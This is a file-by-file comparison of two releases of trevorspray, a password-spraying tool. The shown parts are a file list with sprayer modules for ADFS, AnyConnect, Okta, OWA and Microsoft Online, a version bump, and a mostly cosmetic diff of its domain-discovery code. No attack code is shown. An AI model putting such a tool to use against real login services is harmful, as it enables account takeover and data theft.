# Comparing `tmp/trevorspray-2.0.7.tar.gz` & `tmp/trevorspray-2.0.8.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "trevorspray-2.0.7.tar", max compression
+gzip compressed data, was "trevorspray-2.0.8.tar", max compression
```

## Comparing `trevorspray-2.0.7.tar` & `trevorspray-2.0.8.tar`

### file list

```diff
@@ -1,76 +1,98 @@
--rw-r--r--   0        0        0    35149 2020-09-23 15:46:29.895512 trevorspray-2.0.7/LICENSE
--rw-r--r--   0        0        0    12469 2022-04-27 17:01:20.715523 trevorspray-2.0.7/README.md
--rw-r--r--   0        0        0      730 2022-08-09 18:30:26.518205 trevorspray-2.0.7/pyproject.toml
--rwxr-xr-x   0        0        0     8872 2022-02-07 19:36:03.456951 trevorspray-2.0.7/trevorspray/cli.py
--rw-r--r--   0        0        0    10274 2022-02-05 01:19:08.134611 trevorspray-2.0.7/trevorspray/lib/__pycache__/discover.cpython-310.pyc
--rw-r--r--   0        0        0    10380 2022-02-02 18:01:43.844552 trevorspray-2.0.7/trevorspray/lib/__pycache__/discover.cpython-39.pyc
--rw-r--r--   0        0        0      328 2022-02-05 00:51:49.874543 trevorspray-2.0.7/trevorspray/lib/__pycache__/errors.cpython-310.pyc
--rw-r--r--   0        0        0      324 2021-12-13 20:13:34.963665 trevorspray-2.0.7/trevorspray/lib/__pycache__/errors.cpython-39.pyc
--rw-r--r--   0        0        0     4148 2022-04-25 18:43:52.894020 trevorspray-2.0.7/trevorspray/lib/__pycache__/logger.cpython-310.pyc
--rw-r--r--   0        0        0     3625 2022-01-25 19:23:44.701631 trevorspray-2.0.7/trevorspray/lib/__pycache__/logger.cpython-39.pyc
--rw-r--r--   0        0        0     8383 2022-04-29 20:12:15.812195 trevorspray-2.0.7/trevorspray/lib/__pycache__/proxy.cpython-310.pyc
--rw-r--r--   0        0        0     7910 2022-02-02 20:58:01.961663 trevorspray-2.0.7/trevorspray/lib/__pycache__/proxy.cpython-39.pyc
--rw-r--r--   0        0        0     4880 2022-01-25 18:16:33.441462 trevorspray-2.0.7/trevorspray/lib/__pycache__/sprayer.cpython-39.pyc
--rw-r--r--   0        0        0     6483 2022-04-25 18:43:53.020687 trevorspray-2.0.7/trevorspray/lib/__pycache__/trevor.cpython-310.pyc
--rw-r--r--   0        0        0     6050 2022-02-02 18:57:32.781359 trevorspray-2.0.7/trevorspray/lib/__pycache__/trevor.cpython-39.pyc
--rw-r--r--   0        0        0     4672 2022-01-25 21:00:12.908541 trevorspray-2.0.7/trevorspray/lib/__pycache__/util.cpython-39.pyc
--rw-r--r--   0        0        0    12683 2022-02-05 01:19:01.764611 trevorspray-2.0.7/trevorspray/lib/discover.py
--rw-r--r--   0        0        0      713 2022-02-01 21:14:25.325013 trevorspray-2.0.7/trevorspray/lib/enumerators/__init__.py
--rw-r--r--   0        0        0      752 2022-02-05 00:51:49.937877 trevorspray-2.0.7/trevorspray/lib/enumerators/__pycache__/__init__.cpython-310.pyc
--rw-r--r--   0        0        0      748 2022-02-01 21:14:34.331680 trevorspray-2.0.7/trevorspray/lib/enumerators/__pycache__/__init__.cpython-39.pyc
--rw-r--r--   0        0        0     2215 2022-04-25 18:43:53.024021 trevorspray-2.0.7/trevorspray/lib/enumerators/__pycache__/onedrive.cpython-310.pyc
--rw-r--r--   0        0        0     2177 2022-01-31 20:34:18.741622 trevorspray-2.0.7/trevorspray/lib/enumerators/__pycache__/onedrive.cpython-39.pyc
--rw-r--r--   0        0        0     2057 2022-04-25 18:43:53.024021 trevorspray-2.0.7/trevorspray/lib/enumerators/__pycache__/seamless_sso.cpython-310.pyc
--rw-r--r--   0        0        0     2020 2022-02-01 21:21:47.395032 trevorspray-2.0.7/trevorspray/lib/enumerators/__pycache__/seamless_sso.cpython-39.pyc
--rw-r--r--   0        0        0     2330 2022-02-07 19:36:03.456951 trevorspray-2.0.7/trevorspray/lib/enumerators/onedrive.py
--rw-r--r--   0        0        0     1962 2022-02-07 19:36:03.456951 trevorspray-2.0.7/trevorspray/lib/enumerators/seamless_sso.py
--rw-r--r--   0        0        0       43 2021-12-06 21:41:39.211271 trevorspray-2.0.7/trevorspray/lib/errors.py
--rw-r--r--   0        0        0     4439 2022-02-07 19:36:03.456951 trevorspray-2.0.7/trevorspray/lib/logger.py
--rw-r--r--   0        0        0     1036 2022-02-05 00:51:49.937877 trevorspray-2.0.7/trevorspray/lib/looters/__pycache__/base.cpython-310.pyc
--rw-r--r--   0        0        0     1028 2022-01-27 17:15:46.627782 trevorspray-2.0.7/trevorspray/lib/looters/__pycache__/base.cpython-39.pyc
--rw-r--r--   0        0        0    11619 2022-02-05 00:51:49.937877 trevorspray-2.0.7/trevorspray/lib/looters/__pycache__/msol.cpython-310.pyc
--rw-r--r--   0        0        0    11403 2022-01-25 21:04:10.745217 trevorspray-2.0.7/trevorspray/lib/looters/__pycache__/msol.cpython-39.pyc
--rw-r--r--   0        0        0      523 2022-01-27 17:15:01.654447 trevorspray-2.0.7/trevorspray/lib/looters/base.py
--rw-r--r--   0        0        0    15655 2022-01-25 21:04:05.688551 trevorspray-2.0.7/trevorspray/lib/looters/msol.py
--rw-r--r--   0        0        0    12258 2022-04-27 01:44:07.508934 trevorspray-2.0.7/trevorspray/lib/proxy.py
--rw-r--r--   0        0        0      710 2022-02-01 21:14:21.868346 trevorspray-2.0.7/trevorspray/lib/sprayers/__init__.py
--rw-r--r--   0        0        0      746 2022-02-05 00:51:49.874543 trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/__init__.cpython-310.pyc
--rw-r--r--   0        0        0      742 2022-02-01 21:14:34.305014 trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/__init__.cpython-39.pyc
--rw-r--r--   0        0        0     3247 2022-02-07 14:54:28.512909 trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/adfs.cpython-310.pyc
--rw-r--r--   0        0        0     3245 2022-02-03 20:11:00.807482 trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/adfs.cpython-39.pyc
--rw-r--r--   0        0        0     4879 2022-04-25 18:43:52.970687 trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/anyconnect.cpython-310.pyc
--rw-r--r--   0        0        0     4800 2022-02-03 20:22:37.297511 trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/anyconnect.cpython-39.pyc
--rw-r--r--   0        0        0     3836 2022-02-07 14:54:28.479575 trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/base.cpython-310.pyc
--rw-r--r--   0        0        0     3843 2022-02-03 20:01:13.737457 trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/base.cpython-39.pyc
--rw-r--r--   0        0        0     1289 2022-02-05 00:51:49.937877 trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/example.cpython-310.pyc
--rw-r--r--   0        0        0     1271 2022-01-18 15:54:51.036838 trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/example.cpython-39.pyc
--rw-r--r--   0        0        0     3743 2022-04-25 18:43:53.017354 trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/msol.cpython-310.pyc
--rw-r--r--   0        0        0     3688 2022-02-03 20:11:00.850815 trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/msol.cpython-39.pyc
--rw-r--r--   0        0        0     2054 2022-02-07 14:54:28.512909 trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/okta.cpython-310.pyc
--rw-r--r--   0        0        0     2027 2022-02-03 21:46:45.294387 trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/okta.cpython-39.pyc
--rw-r--r--   0        0        0     2842 2022-02-07 14:54:28.482909 trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/owa.cpython-310.pyc
--rw-r--r--   0        0        0     2752 2022-02-03 20:11:00.794149 trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/owa.cpython-39.pyc
--rw-r--r--   0        0        0     3671 2022-02-07 14:44:50.172885 trevorspray-2.0.7/trevorspray/lib/sprayers/adfs.py
--rw-r--r--   0        0        0     7276 2022-02-07 19:36:03.456951 trevorspray-2.0.7/trevorspray/lib/sprayers/anyconnect.py
--rw-r--r--   0        0        0     4059 2022-02-07 14:44:53.992884 trevorspray-2.0.7/trevorspray/lib/sprayers/base.py
--rw-r--r--   0        0        0     1340 2022-01-18 15:54:48.423505 trevorspray-2.0.7/trevorspray/lib/sprayers/example.py
--rw-r--r--   0        0        0     4833 2022-02-07 19:36:03.456951 trevorspray-2.0.7/trevorspray/lib/sprayers/msol.py
--rw-r--r--   0        0        0     2161 2022-02-07 14:44:50.209551 trevorspray-2.0.7/trevorspray/lib/sprayers/okta.py
--rw-r--r--   0        0        0     3133 2022-02-07 14:44:53.992884 trevorspray-2.0.7/trevorspray/lib/sprayers/owa.py
--rw-r--r--   0        0        0     8147 2022-02-07 19:36:03.456951 trevorspray-2.0.7/trevorspray/lib/trevor.py
--rw-r--r--   0        0        0       90 2022-01-31 18:58:23.098049 trevorspray-2.0.7/trevorspray/lib/util/__init__.py
--rw-r--r--   0        0        0      274 2022-02-05 00:51:49.824543 trevorspray-2.0.7/trevorspray/lib/util/__pycache__/__init__.cpython-310.pyc
--rw-r--r--   0        0        0      272 2022-01-31 18:58:32.148049 trevorspray-2.0.7/trevorspray/lib/util/__pycache__/__init__.cpython-39.pyc
--rw-r--r--   0        0        0     5749 2022-04-25 18:43:52.897354 trevorspray-2.0.7/trevorspray/lib/util/__pycache__/misc.cpython-310.pyc
--rw-r--r--   0        0        0     5534 2022-02-02 15:07:49.377447 trevorspray-2.0.7/trevorspray/lib/util/__pycache__/misc.cpython-39.pyc
--rw-r--r--   0        0        0     6610 2022-02-05 00:51:49.874543 trevorspray-2.0.7/trevorspray/lib/util/__pycache__/ntlmdecoder.cpython-310.pyc
--rw-r--r--   0        0        0     6644 2022-01-28 21:23:31.518382 trevorspray-2.0.7/trevorspray/lib/util/__pycache__/ntlmdecoder.cpython-39.pyc
--rw-r--r--   0        0        0     1165 2022-01-31 16:20:46.034318 trevorspray-2.0.7/trevorspray/lib/util/__pycache__/threading.cpython-39.pyc
--rw-r--r--   0        0        0     4855 2022-02-05 00:51:49.871210 trevorspray-2.0.7/trevorspray/lib/util/__pycache__/threadpool.cpython-310.pyc
--rw-r--r--   0        0        0     4807 2022-01-31 20:14:54.024908 trevorspray-2.0.7/trevorspray/lib/util/__pycache__/threadpool.cpython-39.pyc
--rw-r--r--   0        0        0     5719 2022-02-07 19:36:03.456951 trevorspray-2.0.7/trevorspray/lib/util/misc.py
--rw-r--r--   0        0        0     7405 2022-01-28 21:22:46.675047 trevorspray-2.0.7/trevorspray/lib/util/ntlmdecoder.py
--rw-r--r--   0        0        0     4239 2022-01-31 20:12:08.211567 trevorspray-2.0.7/trevorspray/lib/util/threadpool.py
--rwxr-xr-x   0        0        0     2816 2020-10-15 19:54:12.675089 trevorspray-2.0.7/trevorspray/trevorproxy.py.bak
--rw-r--r--   0        0        0    13932 2022-08-09 18:30:31.872069 trevorspray-2.0.7/setup.py
--rw-r--r--   0        0        0    13537 2022-08-09 18:30:31.872792 trevorspray-2.0.7/PKG-INFO
+-rw-r--r--   0        0        0    35149 2020-09-23 15:46:29.895512 trevorspray-2.0.8/LICENSE
+-rw-r--r--   0        0        0      709 2023-06-20 17:03:10.929231 trevorspray-2.0.8/pyproject.toml
+-rw-r--r--   0        0        0        0 2023-06-20 15:38:56.221364 trevorspray-2.0.8/trevorspray/__init__.py
+-rwxr-xr-x   0        0        0     9888 2023-06-20 16:20:19.141801 trevorspray-2.0.8/trevorspray/cli.py
+-rw-r--r--   0        0        0      173 2023-06-20 15:41:48.178620 trevorspray-2.0.8/trevorspray/lib/__pycache__/__init__.cpython-311.pyc
+-rw-r--r--   0        0        0    10274 2022-02-05 01:19:08.134611 trevorspray-2.0.8/trevorspray/lib/__pycache__/discover.cpython-310.pyc
+-rw-r--r--   0        0        0    19522 2023-06-20 16:59:20.506763 trevorspray-2.0.8/trevorspray/lib/__pycache__/discover.cpython-311.pyc
+-rw-r--r--   0        0        0    10380 2022-02-02 18:01:43.844552 trevorspray-2.0.8/trevorspray/lib/__pycache__/discover.cpython-39.pyc
+-rw-r--r--   0        0        0      328 2022-02-05 00:51:49.874543 trevorspray-2.0.8/trevorspray/lib/__pycache__/errors.cpython-310.pyc
+-rw-r--r--   0        0        0      412 2023-06-20 16:59:20.433427 trevorspray-2.0.8/trevorspray/lib/__pycache__/errors.cpython-311.pyc
+-rw-r--r--   0        0        0      324 2021-12-13 20:13:34.963665 trevorspray-2.0.8/trevorspray/lib/__pycache__/errors.cpython-39.pyc
+-rw-r--r--   0        0        0     4148 2022-04-25 18:43:52.894020 trevorspray-2.0.8/trevorspray/lib/__pycache__/logger.cpython-310.pyc
+-rw-r--r--   0        0        0     6951 2023-06-20 16:59:20.403427 trevorspray-2.0.8/trevorspray/lib/__pycache__/logger.cpython-311.pyc
+-rw-r--r--   0        0        0     3625 2022-01-25 19:23:44.701631 trevorspray-2.0.8/trevorspray/lib/__pycache__/logger.cpython-39.pyc
+-rw-r--r--   0        0        0     8383 2022-04-29 20:12:15.812195 trevorspray-2.0.8/trevorspray/lib/__pycache__/proxy.cpython-310.pyc
+-rw-r--r--   0        0        0    18342 2023-06-20 16:59:20.520097 trevorspray-2.0.8/trevorspray/lib/__pycache__/proxy.cpython-311.pyc
+-rw-r--r--   0        0        0     7910 2022-02-02 20:58:01.961663 trevorspray-2.0.8/trevorspray/lib/__pycache__/proxy.cpython-39.pyc
+-rw-r--r--   0        0        0     4880 2022-01-25 18:16:33.441462 trevorspray-2.0.8/trevorspray/lib/__pycache__/sprayer.cpython-39.pyc
+-rw-r--r--   0        0        0     6483 2022-04-25 18:43:53.020687 trevorspray-2.0.8/trevorspray/lib/__pycache__/trevor.cpython-310.pyc
+-rw-r--r--   0        0        0    14051 2023-06-20 16:59:20.503430 trevorspray-2.0.8/trevorspray/lib/__pycache__/trevor.cpython-311.pyc
+-rw-r--r--   0        0        0     6050 2022-02-02 18:57:32.781359 trevorspray-2.0.8/trevorspray/lib/__pycache__/trevor.cpython-39.pyc
+-rw-r--r--   0        0        0     4672 2022-01-25 21:00:12.908541 trevorspray-2.0.8/trevorspray/lib/__pycache__/util.cpython-39.pyc
+-rw-r--r--   0        0        0    12620 2023-06-20 16:20:19.195134 trevorspray-2.0.8/trevorspray/lib/discover.py
+-rw-r--r--   0        0        0      744 2023-06-20 16:20:18.968468 trevorspray-2.0.8/trevorspray/lib/enumerators/__init__.py
+-rw-r--r--   0        0        0      752 2022-02-05 00:51:49.937877 trevorspray-2.0.8/trevorspray/lib/enumerators/__pycache__/__init__.cpython-310.pyc
+-rw-r--r--   0        0        0     1322 2023-06-20 16:59:20.503430 trevorspray-2.0.8/trevorspray/lib/enumerators/__pycache__/__init__.cpython-311.pyc
+-rw-r--r--   0        0        0      748 2022-02-01 21:14:34.331680 trevorspray-2.0.8/trevorspray/lib/enumerators/__pycache__/__init__.cpython-39.pyc
+-rw-r--r--   0        0        0     2215 2022-04-25 18:43:53.024021 trevorspray-2.0.8/trevorspray/lib/enumerators/__pycache__/onedrive.cpython-310.pyc
+-rw-r--r--   0        0        0     3771 2023-06-20 16:59:20.506763 trevorspray-2.0.8/trevorspray/lib/enumerators/__pycache__/onedrive.cpython-311.pyc
+-rw-r--r--   0        0        0     2177 2022-01-31 20:34:18.741622 trevorspray-2.0.8/trevorspray/lib/enumerators/__pycache__/onedrive.cpython-39.pyc
+-rw-r--r--   0        0        0     2057 2022-04-25 18:43:53.024021 trevorspray-2.0.8/trevorspray/lib/enumerators/__pycache__/seamless_sso.cpython-310.pyc
+-rw-r--r--   0        0        0     2859 2023-06-20 16:59:20.506763 trevorspray-2.0.8/trevorspray/lib/enumerators/__pycache__/seamless_sso.cpython-311.pyc
+-rw-r--r--   0        0        0     2020 2022-02-01 21:21:47.395032 trevorspray-2.0.8/trevorspray/lib/enumerators/__pycache__/seamless_sso.cpython-39.pyc
+-rw-r--r--   0        0        0     2503 2023-06-20 16:20:19.001802 trevorspray-2.0.8/trevorspray/lib/enumerators/onedrive.py
+-rw-r--r--   0        0        0     1935 2023-06-20 16:20:18.988468 trevorspray-2.0.8/trevorspray/lib/enumerators/seamless_sso.py
+-rw-r--r--   0        0        0       44 2023-06-20 16:20:18.948469 trevorspray-2.0.8/trevorspray/lib/errors.py
+-rw-r--r--   0        0        0     4419 2023-06-20 16:20:19.028468 trevorspray-2.0.8/trevorspray/lib/logger.py
+-rw-r--r--   0        0        0     1036 2022-02-05 00:51:49.937877 trevorspray-2.0.8/trevorspray/lib/looters/__pycache__/base.cpython-310.pyc
+-rw-r--r--   0        0        0     1705 2023-06-20 16:59:20.503430 trevorspray-2.0.8/trevorspray/lib/looters/__pycache__/base.cpython-311.pyc
+-rw-r--r--   0        0        0     1028 2022-01-27 17:15:46.627782 trevorspray-2.0.8/trevorspray/lib/looters/__pycache__/base.cpython-39.pyc
+-rw-r--r--   0        0        0    11619 2022-02-05 00:51:49.937877 trevorspray-2.0.8/trevorspray/lib/looters/__pycache__/msol.cpython-310.pyc
+-rw-r--r--   0        0        0    22400 2023-06-20 16:59:20.500096 trevorspray-2.0.8/trevorspray/lib/looters/__pycache__/msol.cpython-311.pyc
+-rw-r--r--   0        0        0    11403 2022-01-25 21:04:10.745217 trevorspray-2.0.8/trevorspray/lib/looters/__pycache__/msol.cpython-39.pyc
+-rw-r--r--   0        0        0      568 2023-06-20 16:20:18.965135 trevorspray-2.0.8/trevorspray/lib/looters/base.py
+-rw-r--r--   0        0        0    16133 2023-06-20 16:20:19.215134 trevorspray-2.0.8/trevorspray/lib/looters/msol.py
+-rw-r--r--   0        0        0    13015 2023-06-20 16:20:19.211801 trevorspray-2.0.8/trevorspray/lib/proxy.py
+-rw-r--r--   0        0        0      765 2023-06-20 16:31:58.921533 trevorspray-2.0.8/trevorspray/lib/sprayers/__init__.py
+-rw-r--r--   0        0        0      746 2022-02-05 00:51:49.874543 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/__init__.cpython-310.pyc
+-rw-r--r--   0        0        0     1324 2023-06-20 16:59:20.430094 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/__init__.cpython-311.pyc
+-rw-r--r--   0        0        0      742 2022-02-01 21:14:34.305014 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/__init__.cpython-39.pyc
+-rw-r--r--   0        0        0     3247 2022-02-07 14:54:28.512909 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/adfs.cpython-310.pyc
+-rw-r--r--   0        0        0     5650 2023-06-20 16:59:20.460095 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/adfs.cpython-311.pyc
+-rw-r--r--   0        0        0     3245 2022-02-03 20:11:00.807482 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/adfs.cpython-39.pyc
+-rw-r--r--   0        0        0     4879 2022-04-25 18:43:52.970687 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/anyconnect.cpython-310.pyc
+-rw-r--r--   0        0        0     9087 2023-06-20 16:59:20.456761 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/anyconnect.cpython-311.pyc
+-rw-r--r--   0        0        0     4800 2022-02-03 20:22:37.297511 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/anyconnect.cpython-39.pyc
+-rw-r--r--   0        0        0     3836 2022-02-07 14:54:28.479575 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/base.cpython-310.pyc
+-rw-r--r--   0        0        0     6895 2023-06-20 16:59:20.433427 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/base.cpython-311.pyc
+-rw-r--r--   0        0        0     3843 2022-02-03 20:01:13.737457 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/base.cpython-39.pyc
+-rw-r--r--   0        0        0     1289 2022-02-05 00:51:49.937877 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/example.cpython-310.pyc
+-rw-r--r--   0        0        0     1784 2023-06-20 16:59:20.503430 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/example.cpython-311.pyc
+-rw-r--r--   0        0        0     1271 2022-01-18 15:54:51.036838 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/example.cpython-39.pyc
+-rw-r--r--   0        0        0     3743 2022-04-25 18:43:53.017354 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/msol.cpython-310.pyc
+-rw-r--r--   0        0        0     5522 2023-06-20 16:59:20.496763 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/msol.cpython-311.pyc
+-rw-r--r--   0        0        0     3688 2022-02-03 20:11:00.850815 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/msol.cpython-39.pyc
+-rw-r--r--   0        0        0     2054 2022-02-07 14:54:28.512909 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/okta.cpython-310.pyc
+-rw-r--r--   0        0        0     3386 2023-06-20 17:00:00.287891 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/okta.cpython-311.pyc
+-rw-r--r--   0        0        0     2027 2022-02-03 21:46:45.294387 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/okta.cpython-39.pyc
+-rw-r--r--   0        0        0     2842 2022-02-07 14:54:28.482909 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/owa.cpython-310.pyc
+-rw-r--r--   0        0        0     4982 2023-06-20 16:59:20.433427 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/owa.cpython-311.pyc
+-rw-r--r--   0        0        0     2752 2022-02-03 20:11:00.794149 trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/owa.cpython-39.pyc
+-rw-r--r--   0        0        0     3781 2023-06-20 16:20:19.031802 trevorspray-2.0.8/trevorspray/lib/sprayers/adfs.py
+-rw-r--r--   0        0        0     7408 2023-06-20 16:20:19.078468 trevorspray-2.0.8/trevorspray/lib/sprayers/anyconnect.py
+-rw-r--r--   0        0        0     4131 2023-06-20 16:20:19.061802 trevorspray-2.0.8/trevorspray/lib/sprayers/base.py
+-rw-r--r--   0        0        0     1297 2023-06-20 16:20:18.995135 trevorspray-2.0.8/trevorspray/lib/sprayers/example.py
+-rw-r--r--   0        0        0     5046 2023-06-20 16:20:19.058468 trevorspray-2.0.8/trevorspray/lib/sprayers/msol.py
+-rw-r--r--   0        0        0     2250 2023-06-20 16:59:57.761155 trevorspray-2.0.8/trevorspray/lib/sprayers/okta.py
+-rw-r--r--   0        0        0     3299 2023-06-20 16:20:19.061802 trevorspray-2.0.8/trevorspray/lib/sprayers/owa.py
+-rw-r--r--   0        0        0     8564 2023-06-20 16:20:19.201801 trevorspray-2.0.8/trevorspray/lib/trevor.py
+-rw-r--r--   0        0        0       91 2023-06-20 16:20:19.031802 trevorspray-2.0.8/trevorspray/lib/util/__init__.py
+-rw-r--r--   0        0        0      274 2022-02-05 00:51:49.824543 trevorspray-2.0.8/trevorspray/lib/util/__pycache__/__init__.cpython-310.pyc
+-rw-r--r--   0        0        0      330 2023-06-20 16:59:20.406760 trevorspray-2.0.8/trevorspray/lib/util/__pycache__/__init__.cpython-311.pyc
+-rw-r--r--   0        0        0      272 2022-01-31 18:58:32.148049 trevorspray-2.0.8/trevorspray/lib/util/__pycache__/__init__.cpython-39.pyc
+-rw-r--r--   0        0        0     5749 2022-04-25 18:43:52.897354 trevorspray-2.0.8/trevorspray/lib/util/__pycache__/misc.cpython-310.pyc
+-rw-r--r--   0        0        0    11382 2023-06-20 16:59:20.406760 trevorspray-2.0.8/trevorspray/lib/util/__pycache__/misc.cpython-311.pyc
+-rw-r--r--   0        0        0     5534 2022-02-02 15:07:49.377447 trevorspray-2.0.8/trevorspray/lib/util/__pycache__/misc.cpython-39.pyc
+-rw-r--r--   0        0        0     6610 2022-02-05 00:51:49.874543 trevorspray-2.0.8/trevorspray/lib/util/__pycache__/ntlmdecoder.cpython-310.pyc
+-rw-r--r--   0        0        0    11205 2023-06-20 16:59:20.430094 trevorspray-2.0.8/trevorspray/lib/util/__pycache__/ntlmdecoder.cpython-311.pyc
+-rw-r--r--   0        0        0     6644 2022-01-28 21:23:31.518382 trevorspray-2.0.8/trevorspray/lib/util/__pycache__/ntlmdecoder.cpython-39.pyc
+-rw-r--r--   0        0        0     1165 2022-01-31 16:20:46.034318 trevorspray-2.0.8/trevorspray/lib/util/__pycache__/threading.cpython-39.pyc
+-rw-r--r--   0        0        0     4855 2022-02-05 00:51:49.871210 trevorspray-2.0.8/trevorspray/lib/util/__pycache__/threadpool.cpython-310.pyc
+-rw-r--r--   0        0        0     9259 2023-06-20 16:59:20.430094 trevorspray-2.0.8/trevorspray/lib/util/__pycache__/threadpool.cpython-311.pyc
+-rw-r--r--   0        0        0     4807 2022-01-31 20:14:54.024908 trevorspray-2.0.8/trevorspray/lib/util/__pycache__/threadpool.cpython-39.pyc
+-rw-r--r--   0        0        0     5763 2023-06-20 16:20:19.168468 trevorspray-2.0.8/trevorspray/lib/util/misc.py
+-rw-r--r--   0        0        0     7407 2023-06-20 16:20:19.128468 trevorspray-2.0.8/trevorspray/lib/util/ntlmdecoder.py
+-rw-r--r--   0        0        0     4374 2023-06-20 16:20:19.151801 trevorspray-2.0.8/trevorspray/lib/util/threadpool.py
+-rwxr-xr-x   0        0        0     2816 2020-10-15 19:54:12.675089 trevorspray-2.0.8/trevorspray/trevorproxy.py.bak
+-rw-r--r--   0        0        0     1077 1970-01-01 00:00:00.000000 trevorspray-2.0.8/PKG-INFO
```

### Comparing `trevorspray-2.0.7/LICENSE` & `trevorspray-2.0.8/LICENSE`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/pyproject.toml` & `trevorspray-2.0.8/pyproject.toml`

 * *Files 4% similar despite different names*

```diff
@@ -1,16 +1,15 @@
 [tool.poetry]
 name = "trevorspray"
-version = "2.0.7"
+version = "2.0.8"
 description = "A modular password sprayer with threading, SSH proxying, loot modules, and more"
 authors = ["TheTechromancer"]
 license = "GPL-3.0"
 repository = "https://github.com/blacklanternsecurity/TREVORspray"
 homepage = "https://github.com/blacklanternsecurity/TREVORspray"
-readme = "README.md"
 
 [tool.poetry.dependencies]
 python = "^3.6"
 Pygments = "^2.10.0"
 sh = "^1.14.2"
 PySocks = "^1.7.1"
 exchangelib = "^4.6.1"
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/__pycache__/discover.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/__pycache__/discover.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/__pycache__/discover.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/__pycache__/discover.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/__pycache__/logger.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/__pycache__/logger.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/__pycache__/logger.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/__pycache__/logger.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/__pycache__/proxy.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/__pycache__/proxy.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/__pycache__/proxy.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/__pycache__/proxy.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/__pycache__/sprayer.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/__pycache__/sprayer.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/__pycache__/trevor.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/__pycache__/trevor.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/__pycache__/trevor.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/__pycache__/trevor.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/__pycache__/util.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/__pycache__/util.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/discover.py` & `trevorspray-2.0.8/trevorspray/lib/discover.py`

 * *Files 7% similar despite different names*

```diff
@@ -3,157 +3,139 @@
 import socket
 import logging
 import requests
 import dns.resolver
 from .util import *
 import concurrent.futures
 from contextlib import suppress
-from urllib.parse import urlparse,urlunparse
+from urllib.parse import urlparse, urlunparse
 
-log = logging.getLogger('trevorspray.discovery')
+log = logging.getLogger("trevorspray.discovery")
 
 suggestion_regexes = (
-    re.compile(r'[^\d\W_-]+', re.I),
-    re.compile(r'[^\W_-]+', re.I),
-    re.compile(r'[^\d\W]+', re.I),
-    re.compile(r'[^\W]+', re.I),
+    re.compile(r"[^\d\W_-]+", re.I),
+    re.compile(r"[^\W_-]+", re.I),
+    re.compile(r"[^\d\W]+", re.I),
+    re.compile(r"[^\W]+", re.I),
 )
 
-class DomainDiscovery:
 
+class DomainDiscovery:
     def __init__(self, trevor, domain):
-
         self.trevor = trevor
-        self.domain = ''.join(str(domain).split()).strip('/')
+        self.domain = "".join(str(domain).split()).strip("/")
 
         self._mxrecords = None
         self._txtrecords = None
         self._autodiscover = None
         self._userrealm = None
         self._openid_configuration = None
         self._msoldomains = None
         self._owa = None
         self._onedrive_tenantnames = None
